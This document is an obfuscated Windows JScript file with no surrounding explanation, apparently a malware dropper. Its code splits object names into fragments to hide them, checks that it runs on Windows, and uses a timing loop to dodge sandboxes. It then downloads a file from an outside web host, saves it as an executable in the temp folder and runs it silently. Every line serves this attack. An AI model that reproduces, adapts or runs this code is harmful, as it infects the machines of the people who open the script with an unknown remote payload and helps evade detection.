var M = false;
var O = "Create"+"Object";
var XJ0 = function Z() {return WScript[O]("WScript"+".Shell");}(), TB = 11;
var TW = "MSXML2"+".XMLHTTP";
var E = 2;
var L = E - 2;
function K0(B1){XJ0["Run"](B1, L, L);};
function PW(){return TW + "";};
function Z0(R1, M0){L = L * 1; return R1 - M0;};
function D(){return O;};
/*@cc_on
  @if (@_win32 || @_win64)
    M = true;
  @end
@*/
if (M)
{
var U = "";
function R(){return 22;};
var RA = 0; var HY = 0;
function K()
{
var AD = new this["Date"]();
var XX = AD["getUTCMilliseconds"]();
WScript["Sleep"](R());
var AD = new this["Date"]();
var B = AD["getUTCMilliseconds"]();
WScript["Sleep"](R());
var AD = new this["Date"]();
var MF = AD["getUTCMilliseconds"]();
var RA = "F";
RA = Z0(B, XX);
var HY = "ZN";
HY = Z0(MF, B);
U = "open";
return Z0(RA, HY);
}
var XJ = false;
var N = false;
for (var EH = L; EH < R() * 1; EH++){if (K() != L){
XJ = true; 
HY = "31" + 11 * RA + HY; 
N = true; 
break;
}}
function GQ() {return ((XJ == true) && (XJ == N)) ? 1 : L;};
if (XJ && GQ() && N){
function UL() {return XJ0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "NsrR6Jjz.ex" + "e";};
 R0 = PW();
 TH = WScript[O](R0);
 var OX = 1;
do { 
	for (;OX;){
	try {
		if (OX == 1)
		{
			TH[U]("GET", "http://tools24.nl/w8isa", false);
			TH["send"]();
			B0 = "Sleep";
			OX = 2;
		}
		WScript[B0](R() + 120); 
		if (TH["readystate"] < 2 * 2) continue;
		OX = L;
		function UM(MQ) {var QW = (1, 2, 3, 4, 5, MQ); return QW;};
		GB = WScript[D()]("ADODB.Stream");
		R0 = GB;
		R0[U]();
		R0["type"] = UM(1);
		R0["write"](TH["ResponseBody"]);
		GB["position"] = UM(L);
		R0["Save" + "ToFile"](UL(), 2);
		GB["cl"+"ose"]();
		QA = UL();
		K0(QA);
	} catch(NQ){};};
}while (OX);
}
}

